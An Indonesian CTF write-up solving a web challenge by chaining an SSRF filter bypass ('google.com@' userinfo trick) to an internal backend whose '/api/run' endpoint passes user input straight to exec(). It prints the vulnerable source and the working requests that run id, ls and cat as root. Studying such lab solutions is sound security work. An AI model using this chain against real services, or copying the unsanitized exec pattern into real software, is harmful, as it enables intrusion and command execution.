**Kategori:** Web / SSRF + Command Injection <br>
**File:** `index.js` (source backend bocor) <br>
**Flag:** `HCS{CUm4_b154_F3tCH_60og13_RaNDom_}` <br>
**AI Chat:** I did not use AI <br>

---

## 1. Deskripsi Challenge

Sebuah "URL Fetcher (BETA)":

> Gunakan endpoint `/fetch?url=http://google.com` untuk mengambil data dari URL.

Dari tampilan awal ketahuan web ini **cuma bisa fetch ke `google.com`** — ada whitelist/filter di depan. Targetnya: bypass filter itu untuk menjangkau service internal, lalu naik jadi RCE.

---

## 2. Recon: Source `index.js`

Dari file `index.js` yang bocor terlihat ada API endpoint `/api/run` yang menerima parameter `cmd` dan **mengeksekusinya langsung** lewat `exec()`, berjalan di **port 3000**:

```js
const { exec } = require("child_process");
const PORT = 3000;

app.get("/api/run", (req, res) => {
  const { cmd } = req.query;
  if (!cmd) {
    return res.status(400).send("Parameter 'cmd' dibutuhkan!");
  }
  exec(cmd, (error, stdout, stderr) => {      // <-- command injection langsung
    if (error)  return res.status(500).send(`Error: ${error.message}`);
    if (stderr) return res.status(500).send(`Stderr: ${stderr}`);
    res.send(`<pre>${stdout}</pre>`);
  });
});
```

`app.get("/")` juga cuma membalas `"Internal Backend Service"` — jadi `index.js` ini adalah **backend internal**, bukan front fetcher yang kita akses. Artinya kita perlu SSRF dari fetcher menuju backend ini di `:3000`, lalu panggil `/api/run?cmd=`.

---

## 3. Nama Service Internal

Dari hint di halaman:

> nama service internal nya `backend` 
> HINT: https://share.google/qIMQZHERcIMKvrD1F

Jadi hostname internal yang mesti dituju adalah **`backend`** pada port `3000`.

---

## 4. Bypass Filter URL (SSRF via userinfo)

Filter fetcher hanya mengizinkan `google.com`. Trik: pakai **`@` (userinfo)** pada URL sehingga bagian sebelum `@` diperlakukan sebagai kredensial, dan host sebenarnya adalah yang **setelah** `@`:

```
http://google.com@backend:3000/api/run?cmd=id
```

Bagi filter naif, string ini "mengandung google.com"; bagi parser URL, host aslinya adalah `backend:3000`. Gabungkan dengan endpoint `/api/run?cmd=` untuk mencapai command execution.

Request penuh via fetcher:

```
/fetch?url=http://google.com@backend:3000/api/run?cmd=id
```

Response:

```
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),...
```

Valid — dan kita **root**.

---

## 5. Ambil Flag

Enumerasi root filesystem:

```
/fetch?url=http://google.com@backend:3000/api/run?cmd=ls /
```

```
app  bin  dev  etc  flag-7bc2d557.txt  home  lib  media  mnt  opt  proc  root  run  sbin  srv  sys  tmp ...
```

Baca file flag yang namanya ter-randomize:

```
/fetch?url=http://google.com@backend:3000/api/run?cmd=cat /flag-7bc2d557.txt
```

```
HCS{CUm4_b154_F3tCH_60og13_RaNDom_}
```

---

## 6. Verifikasi

Chain-nya: **filter bypass (userinfo `@`) → SSRF ke `backend:3000` → command injection via `/api/run?cmd=` → RCE sebagai root → `cat` flag**. Flag berformat `HCS{...}` dan konsisten dengan tema "fetch google random". 
_Solved!_
